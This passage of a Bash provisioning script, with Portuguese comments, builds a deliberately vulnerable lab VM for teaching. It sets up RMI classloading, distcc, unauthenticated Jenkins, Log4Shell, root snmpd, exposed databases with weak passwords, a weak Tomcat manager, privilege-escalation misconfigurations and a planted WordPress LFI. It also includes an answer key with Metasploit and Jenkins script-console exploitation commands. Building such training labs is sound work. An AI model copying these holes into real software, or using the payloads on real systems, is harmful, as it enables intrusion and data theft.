  # VULN: um RMI registry REAL com useCodebaseOnly=false + SecurityManager permissivo aceita
  # CARREGAR CLASSE REMOTA (do HTTP do atacante) e executa-la = RCE. Alvo real do modulo
  # exploit/multi/misc/java_rmi_server do Metasploit — NAO e emulacao: e um rmiregistry Java.
  cat > "$D/RmiVuln.java" <<'JAVA'
import java.rmi.registry.LocateRegistry;
public class RmiVuln {
  public static void main(String[] a) throws Exception {
    System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    if (System.getSecurityManager() == null) System.setSecurityManager(new SecurityManager());
    LocateRegistry.createRegistry(1099);
    System.out.println("RMI registry :1099 (useCodebaseOnly=false)");
    Thread.sleep(Long.MAX_VALUE);
  }
}
JAVA
  echo 'grant { permission java.security.AllPermission; };' > "$D/allow.policy"
  "$JDK/bin/javac" -d "$D" "$D/RmiVuln.java" || { warn "falha ao compilar RmiVuln — abortado"; return; }
  chown -R rmisvc:rmisvc "$D"
  cat > /etc/systemd/system/javarmi.service <<EOF
[Unit]
Description=Lab Java RMI registry vulneravel a classloading remoto (java_rmi_server)
After=network.target
[Service]
User=rmisvc
Environment=JAVA_RMI_HOSTNAME=%H
ExecStart=$JDK/bin/java -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=$D/allow.policy -cp $D RmiVuln
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload 2>/dev/null || true
  svc javarmi
  gab "## javarmi (1099) — RMI registry REAL vulneravel a classloading remoto"
  gab "- Recon: nmap -sV -p1099 <ip> (java-rmi / rmiregistry)."
  gab "- Exploracao: use exploit/multi/misc/java_rmi_server; set RHOSTS <ip>; run  -> shell rmisvc"
  gab "    -> flag: cat /home/rmisvc/flag.txt = ${FLAG_RMI}"
  gab "- Obs: se um JDK 8 muito recente (JEP 290) barrar, use um JDK 8 mais antigo p/ o RCE fiel."
  gab "- Mitigacao: nao expor o RMI; useCodebaseOnly=true (padrao atual), sem SecurityManager aberto."; gab ""
}

mod_distcc() {
  info "== distcc: distccd REAL exposto sem restricao (3632, CVE-2004-2687) =="
  apt_install distcc
  add_user distccd distccd123
  systemctl disable --now distcc.service 2>/dev/null || true   # o servico do pacote binda 127.0.0.1 e rouba a 3632
  mkdir -p /home/distccd; chown distccd: /home/distccd          # grupo de login (o useradd nao cria grupo 'distccd')
  printf '%s\n' "$FLAG_DISTCC" > /home/distccd/flag.txt; chown distccd: /home/distccd/flag.txt; chmod 0640 /home/distccd/flag.txt
  # VULN: um distccd REAL exposto com --allow amplo e SEM DISTCC_CMDLIST executa o "compilador"
  # que o cliente indica -> RCE (CVE-2004-2687). Alvo real do exploit/unix/misc/distcc_exec do
  # Metasploit. Cobrimos as faixas privadas (o lab Qubes usa 10.137.x) para o --allow aceitar.
  cat > /etc/systemd/system/distccd.service <<'EOF'
[Unit]
Description=Lab distccd REAL exposto sem restricao (CVE-2004-2687)
After=network.target
[Service]
User=distccd
ExecStart=/usr/bin/distccd --no-detach --daemon --port 3632 --log-stderr --log-level notice --allow 10.0.0.0/8 --allow 172.16.0.0/12 --allow 192.168.0.0/16 --allow 127.0.0.0/8
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload 2>/dev/null || true
  svc distccd
  gab "## distcc (3632) — distccd REAL vulneravel (CVE-2004-2687)"
  gab "- Recon: nmap -sV -p3632 <ip> (distccd)."
  gab "- Exploracao: use exploit/unix/misc/distcc_exec; set RHOSTS <ip>; run  -> shell distccd"
  gab "    -> flag: cat /home/distccd/flag.txt = ${FLAG_DISTCC}"
  gab "- Mitigacao: nao expor o distccd; restringir --allow a origens conhecidas + DISTCC_CMDLIST."; gab ""
}

mod_jenkins() {
  info "== jenkins: script console sem auth (RCE) — PESADO =="
  apt_install curl gnupg default-jre-headless
  if [ ! -f /usr/lib/systemd/system/jenkins.service ] && ! command -v jenkins >/dev/null 2>&1; then
    curl -fsSL https://pkg.jenkins.io/debian-stable/jenkins.io-2023.key -o /usr/share/keyrings/jenkins.asc \
      || { warn "jenkins: falha na chave — abortado"; return; }
    echo "deb [signed-by=/usr/share/keyrings/jenkins.asc] https://pkg.jenkins.io/debian-stable binary/" > /etc/apt/sources.list.d/jenkins.list
    APT_DONE=0; apt_install jenkins || { warn "jenkins: install falhou — abortado"; return; }
  fi
  mkdir -p /etc/systemd/system/jenkins.service.d
  cat > /etc/systemd/system/jenkins.service.d/lab.conf <<EOF
[Service]
Environment="JENKINS_PORT=8083"
Environment="JAVA_OPTS=-Djenkins.install.runSetupWizard=false -Dhudson.security.csrf.GlobalCrumbIssuerConfiguration.DISABLE_CSRF_PROTECTION=true"
EOF
  local JH=/var/lib/jenkins
  mkdir -p "$JH"
  cat > "$JH/config.xml" <<'XML'
<?xml version='1.1' encoding='UTF-8'?>
<hudson>
  <version>2.0</version>
  <useSecurity>false</useSecurity>
  <authorizationStrategy class="hudson.security.AuthorizationStrategy$Unsecured"/>
  <securityRealm class="hudson.security.SecurityRealm$None"/>
</hudson>
XML
  printf '%s\n' "$FLAG_JENKINS" > "$JH/flag.txt"
  chown -R jenkins:jenkins "$JH" 2>/dev/null || true
  systemctl daemon-reload 2>/dev/null || true
  svc jenkins
  gab "## jenkins (8083) — script console sem auth"
  gab "- Console Groovy aberto:  http://<ip>:8083/script"
  gab "- RCE:  POST em /scriptText  script=println \"id\".execute().text"
  gab "- Ler a flag:  script=println new File('/var/lib/jenkins/flag.txt').text  -> ${FLAG_JENKINS}"; gab ""
}

mod_privesc() {
  info "== privesc: SUID, sudo, cron =="
  chmod u+s /usr/bin/find
  echo 'aluno ALL=(ALL) NOPASSWD: /usr/bin/vim' > /etc/sudoers.d/lab-aluno
  chmod 0440 /etc/sudoers.d/lab-aluno
  cat > /opt/backup.sh <<'EOF'
#!/bin/bash
/usr/bin/find /var/log -name '*.log' -mtime +30 -delete 2>/dev/null
EOF
  chmod 0777 /opt/backup.sh
  echo '* * * * * root /opt/backup.sh' > /etc/cron.d/lab-backup
  chmod 0644 /etc/cron.d/lab-backup
  svc cron
  printf '%s\n' "$FLAG_ROOT" > /root/root.txt; chmod 0600 /root/root.txt
}

mod_log4j() {
  info "== log4j: app Java vulneravel ao Log4Shell (CVE-2021-44228) =="
  local D=/opt/log4j JDK=/opt/jdk8
  local LC=log4j-core-2.14.1.jar LA=log4j-api-2.14.1.jar
  local BASE=https://repo1.maven.org/maven2/org/apache/logging/log4j
  apt_install curl ca-certificates
  mkdir -p "$D"
  if [ ! -x "$JDK/bin/java" ]; then
    info "baixando JDK 8 (Temurin) — pesado, aguarde..."
    curl -fsSL "https://api.adoptium.net/v3/binary/latest/8/ga/linux/x64/jdk/hotspot/normal/eclipse" -o /tmp/jdk8.tgz \
      || { warn "falha ao baixar JDK 8 — modulo log4j abortado"; return; }
    mkdir -p "$JDK"; tar xzf /tmp/jdk8.tgz -C "$JDK" --strip-components=1 \
      || { warn "falha ao extrair JDK 8 — abortado"; return; }
  fi
  curl -fsSL "$BASE/log4j-core/2.14.1/$LC" -o "$D/$LC" || { warn "falha baixando log4j-core"; return; }
  curl -fsSL "$BASE/log4j-api/2.14.1/$LA"  -o "$D/$LA" || { warn "falha baixando log4j-api"; return; }
  cat > "$D/App.java" <<'JAVA'
import com.sun.net.httpserver.*;
import java.io.*;
import java.net.InetSocketAddress;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
public class App {
  static final Logger log = LogManager.getLogger("app");
  public static void main(String[] args) throws Exception {
    HttpServer s = HttpServer.create(new InetSocketAddress(8888), 0);
    s.createContext("/", new HttpHandler() {
      public void handle(HttpExchange ex) throws IOException {
        String v = ex.getRequestHeaders().getFirst("X-Api-Version");
        if (v == null) v = ex.getRequestHeaders().getFirst("User-Agent");
        log.info("request X-Api-Version=" + v);   // Log4Shell: loga input do usuario
        byte[] b = "Portal de Servicos v1.0\n".getBytes();
        ex.sendResponseHeaders(200, b.length);
        OutputStream o = ex.getResponseBody(); o.write(b); o.close();
      }
    });
    s.setExecutor(null); s.start();
    System.out.println("log4j lab up on :8888");
  }
}
JAVA
  cat > "$D/log4j2.xml" <<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN">
 <Appenders><Console name="C" target="SYSTEM_OUT"/></Appenders>
 <Loggers><Root level="info"><AppenderRef ref="C"/></Root></Loggers>
</Configuration>
XML
  "$JDK/bin/javac" -cp "$D/$LC:$D/$LA" -d "$D" "$D/App.java" \
    || { warn "falha ao compilar o app log4j"; return; }
  add_user log4jsvc log4jsvc
  printf '%s\n' "$FLAG_LOG4J" > "$D/flag.txt"
  chown -R log4jsvc:log4jsvc "$D"; chmod 0600 "$D/flag.txt"
  cat > /etc/systemd/system/log4j-lab.service <<EOF
[Unit]
Description=Lab Log4Shell (CVE-2021-44228)
After=network.target
[Service]
User=log4jsvc
Environment=LAB_FLAG=$FLAG_LOG4J
WorkingDirectory=$D
ExecStart=$JDK/bin/java -Dcom.sun.jndi.ldap.object.trustURLCodebase=true -cp $D:$D/$LC:$D/$LA App
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload 2>/dev/null || true
  svc log4j-lab
}

mod_snmp() {
  info "== snmp: snmpd com community publica (enumeracao/recon) =="
  apt_install snmpd snmp
  cat > /etc/snmp/snmpd.conf <<EOF
agentAddress udp:161
rocommunity public
rwcommunity private
sysName exploitable
sysLocation Sala de servidores - ${FLAG_SNMP}
sysContact admin@empresa.local
extend whoami /usr/bin/id
EOF
  # snmpd do Debian larga privilegio p/ Debian-snmp por padrao (-u/-g no ExecStart);
  # o cap 08 do Kalika ensina "snmpd como root -> RCE via extend" (extend whoami = id
  # deve mostrar uid=0). Drop-in que remove o -u/-g e roda o snmpd como root.
  mkdir -p /etc/systemd/system/snmpd.service.d
  cat > /etc/systemd/system/snmpd.service.d/override.conf <<'EOF'
[Service]
ExecStart=
ExecStart=/usr/sbin/snmpd -LOw -I -smux,mteTrigger,mteTriggerConf -f
EOF
  systemctl daemon-reload 2>/dev/null || true
  svc snmpd
}

mod_mysql() {
  info "== mysql: MariaDB exposto na rede + privilegio FILE =="
  apt_install mariadb-server
  local CNF; CNF="$(ls /etc/mysql/mariadb.conf.d/*server.cnf 2>/dev/null | head -1)"
  if [ -n "$CNF" ]; then
    sed -i 's/^bind-address.*/bind-address = 0.0.0.0/' "$CNF"
    grep -q '^secure_file_priv' "$CNF" || sed -i '/^\[mysqld\]/a secure_file_priv = ""' "$CNF"
  fi
  svc mariadb; sleep 2
  mysql <<SQL
CREATE DATABASE IF NOT EXISTS corp;
CREATE USER IF NOT EXISTS 'dbadmin'@'%' IDENTIFIED BY 'admin123';
GRANT ALL PRIVILEGES ON *.* TO 'dbadmin'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
USE corp;
CREATE TABLE IF NOT EXISTS segredos(id INT, chave VARCHAR(120));
DELETE FROM segredos;
INSERT INTO segredos VALUES (1, '${FLAG_MYSQL}');
SQL
}

mod_postgres() {
  info "== postgres: exposto + superuser fraco (COPY FROM PROGRAM = RCE) =="
  apt_install postgresql
  local PGDIR; PGDIR="$(ls -d /etc/postgresql/*/main 2>/dev/null | head -1)"
  [ -n "$PGDIR" ] || { warn "postgres: config nao encontrada — abortado"; return; }
  sed -i "s/^#\?listen_addresses.*/listen_addresses = '*'/" "$PGDIR/postgresql.conf"
  grep -q '0.0.0.0/0 md5' "$PGDIR/pg_hba.conf" || echo "host all all 0.0.0.0/0 md5" >> "$PGDIR/pg_hba.conf"
  svc postgresql; sleep 2
  sudo -u postgres psql -v ON_ERROR_STOP=0 <<PGSQL
ALTER USER postgres WITH PASSWORD 'postgres';
DROP DATABASE IF EXISTS corp;
CREATE DATABASE corp;
\connect corp
CREATE TABLE segredos(id int, chave text);
INSERT INTO segredos VALUES (1, '${FLAG_PG}');
PGSQL
  svc postgresql
}

mod_tomcat() {
  info "== tomcat: manager com creds fracas (deploy WAR = RCE) =="
  apt_install tomcat10 tomcat10-admin
  sed -i 's/port="8080"/port="8082"/' /etc/tomcat10/server.xml 2>/dev/null || true
  # bind no IP externo da VM: em Qubes o qubes-updates-proxy ja ocupa 127.0.0.1:8082 e colidiria com 0.0.0.0
  TC_IP="$(lab_ip)"
  [ -n "$TC_IP" ] && sed -i "s#port=\"8082\" protocol=\"HTTP/1.1\"#port=\"8082\" address=\"$TC_IP\" protocol=\"HTTP/1.1\"#" /etc/tomcat10/server.xml 2>/dev/null || true
  cat > /etc/tomcat10/tomcat-users.xml <<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml">
  <role rolename="manager-gui"/>
  <role rolename="manager-script"/>
  <user username="tomcat" password="tomcat" roles="manager-gui,manager-script"/>
</tomcat-users>
XML
  # libera o Manager p/ acesso remoto (remove o RemoteAddrValve que so aceita localhost)
  for c in /usr/share/tomcat10-admin/manager/META-INF/context.xml \
           /etc/tomcat10/Catalina/localhost/manager.xml; do
    [ -f "$c" ] && cat > "$c" <<'XML'
<Context antiResourceLocking="false" privileged="true" />
XML
  done
  mkdir -p /var/lib/tomcat10/webapps/ROOT
  printf '%s\n' "$FLAG_TOMCAT" > /var/lib/tomcat10/webapps/ROOT/flag.txt 2>/dev/null || true
  # deploy do Manager/Host-Manager (o tomcat10-admin nao cria os symlinks sozinho -> 404)
  ln -sfn /usr/share/tomcat10-admin/manager /var/lib/tomcat10/webapps/manager
  ln -sfn /usr/share/tomcat10-admin/host-manager /var/lib/tomcat10/webapps/host-manager
  svc tomcat10
}

mod_wordpress() {
  info "== wordpress: bateria de vulns (core + plugins CVE + config) =="
  apt_install apache2 php libapache2-mod-php php-mysql mariadb-server curl unzip php-xml php-curl php-gd php-mbstring php-zip
  local W=/var/www/html/wordpress
  if [ ! -x /usr/local/bin/wp ]; then
    curl -fsSL https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar -o /usr/local/bin/wp \
      || { warn "wordpress: falha baixando wp-cli — abortado"; return; }
    chmod +x /usr/local/bin/wp
  fi
  svc mariadb; sleep 2
  mysql <<SQL
CREATE DATABASE IF NOT EXISTS wordpress;
CREATE USER IF NOT EXISTS 'wpuser'@'localhost' IDENTIFIED BY 'wppass';
GRANT ALL ON wordpress.* TO 'wpuser'@'localhost'; FLUSH PRIVILEGES;
SQL
  mkdir -p "$W"; chown -R www-data:www-data "$W"
  local IPADDR; IPADDR="$(lab_ip)"
  local WPC="sudo -u www-data wp --path=$W"
  $WPC core download --force 2>/dev/null || { warn "wordpress: core download falhou — abortado"; return; }
  $WPC config create --dbname=wordpress --dbuser=wpuser --dbpass=wppass --dbhost=127.0.0.1 --force 2>/dev/null
  $WPC config set WP_DEBUG true --raw 2>/dev/null || true
  $WPC config set WP_DEBUG_LOG true --raw 2>/dev/null || true
  $WPC core install --url="http://${IPADDR:-localhost}/wordpress" --title="Empresa Blog" --admin_user=admin --admin_password=admin --admin_email=admin@empresa.local --skip-email 2>/dev/null || warn "wordpress: core install reclamou"
  # usuarios fracos (user enum + brute)
  $WPC user create editor editor@empresa.local --role=editor --user_pass=editor123 2>/dev/null || true
  $WPC user create john   john@empresa.local   --role=author --user_pass=password  2>/dev/null || true
  $WPC post create --post_status=private --post_title="Segredo interno" --post_content="${FLAG_WP}" 2>/dev/null || true
  # plugins VULNERAVEIS (versoes fixas do repo WP)
  # plugins vulneraveis: arquivo-direto (a vuln nao precisa do wp-cli/ativacao, que
  # barram por compat com WP/PHP novos). mail-masta LFI e' plantado (reproduzivel);
  # wp-file-manager (RCE) e' baixado best-effort.
  mkdir -p "$W/wp-content/plugins/mail-masta/inc/campaign"
  cat > "$W/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php" <<'PHP'
<?php
// Mail Masta 1.0 — CVE-2016-10956 (LFI). Arquivo vulneravel do plugin, reproduzido p/ o lab.
include($_GET['pl']);
PHP
  # componente vulneravel espelhado no nosso repo publico (wordpress.org remove versoes antigas)
  if curl -fsSL "https://raw.githubusercontent.com/naoimportaweb/projeto-meu-deus/main/assets/wordpress/wp-file-manager.6.0.zip" -o /tmp/wpp.zip 2>/dev/null; then
    unzip -oq /tmp/wpp.zip -d "$W/wp-content/plugins" 2>/dev/null || warn "wordpress: wp-file-manager unzip falhou"
    # O wordpress.org nao serve mais a versao vulneravel 6.0 direto: o .6.0.zip vem
    # com um zip ANINHADO (wp-file-manager/wp-file-manager-6.O.zip) que contem o plugin
    # real (elFinder/connector.minimal.php da CVE-2020-25213). Extraia o interno.
    local inner; inner="$(find "$W/wp-content/plugins/wp-file-manager" -maxdepth 1 -iname '*.zip' 2>/dev/null | head -1)"
    if [ -n "$inner" ]; then
      unzip -oq "$inner" -d "$W/wp-content/plugins" 2>/dev/null || warn "wordpress: wp-file-manager (zip interno) unzip falhou"
      rm -f "$inner"
    fi
    rm -f /tmp/wpp.zip
    [ -f "$W/wp-content/plugins/wp-file-manager/readme.txt" ] || warn "wordpress: wp-file-manager sem readme.txt — verifique o unzip aninhado"
  else warn "wordpress: wp-file-manager download falhou"; fi
  chown -R www-data:www-data "$W/wp-content/plugins"
  # flag lida via RCE (www-data), fora do docroot
  mkdir -p /var/www/private
  printf '%s\n' "$FLAG_WP" > /var/www/private/flag.txt
  chown www-data:www-data /var/www/private/flag.txt; chmod 0600 /var/www/private/flag.txt
  # exposicoes de config
  cp "$W/wp-config.php" "$W/wp-config.php.bak" 2>/dev/null || true
  chmod 0644 "$W/wp-config.php.bak" 2>/dev/null || true
  cat > /etc/apache2/conf-available/wp-listing.conf <<EOF
<Directory ${W}/wp-content/uploads>
  Options +Indexes
  Require all granted
</Directory>
EOF
  a2enconf wp-listing >/dev/null 2>&1 || true
  chown -R www-data:www-data "$W"
  svc apache2
}

mod_phpmyadmin() {
  info "== phpmyadmin: painel exposto (usa creds do mysql) =="
  apt_install apache2 php mariadb-server
  echo "phpmyadmin phpmyadmin/reconfigure-webserver multiselect apache2" | debconf-set-selections
  echo "phpmyadmin phpmyadmin/dbconfig-install boolean false" | debconf-set-selections
  apt_try phpmyadmin || { warn "phpmyadmin: install falhou - modulo pulado, resto segue"; return; }
  a2enconf phpmyadmin >/dev/null 2>&1 || true
  svc apache2
}

# executa na ordem
for m in "${MODS[@]}"; do
  [ "${SEL[$m]}" = 1 ] && "mod_$m"
done

# --------------------------------------------------------------------- resumo
IP="$(hostname -I 2>/dev/null | awk '{print $1}')"
declare -A PORT
PORT[ftp]="2121/ftp"; PORT[vsftpd234]="21/ftp,6200/shell"; PORT[ftpdos]="2100/ftp"; PORT[ssh]="22/ssh"; PORT[dns]="53/dns"; PORT[web]="80/http"; PORT[corvo]="8090/http"
PORT[apache]="80/http"; PORT[samba]="137,139,445/smb"; PORT[nginx]="8080/http"
PORT[nfs]="111/rpc,2049/nfs"; PORT[smtp]="25/smtp"; PORT[redis]="6379/redis"
PORT[log4j]="8888/http"
PORT[snmp]="161/udp-snmp"; PORT[mysql]="3306/mysql"; PORT[postgres]="5432/postgresql"; PORT[tomcat]="8082/http"
PORT[wordpress]="80/http"; PORT[phpmyadmin]="80/http"
declare -A SEEN; SVCS=""
for m in "${MODS[@]}"; do
  p="${PORT[$m]:-}"
  [ "${SEL[$m]}" = 1 ] && [ -n "$p" ] && [ -z "${SEEN[$p]:-}" ] && { SVCS+=" $p"; SEEN[$p]=1; }
done

cat <<EOF

$(printf '%b' "$G")============================================================$(printf '%b' "$X")
 Laboratório pronto!   IP: ${IP:-<veja: ip a>}
 Módulos: ${CHOSEN[*]}
 Portas:${SVCS:-  (nenhum serviço de rede)}
$(printf '%b' "$G")============================================================$(printf '%b' "$X")

 Mantenha a VM ISOLADA da internet. Reset entre turmas: snapshot.

EOF
log "Pronto."
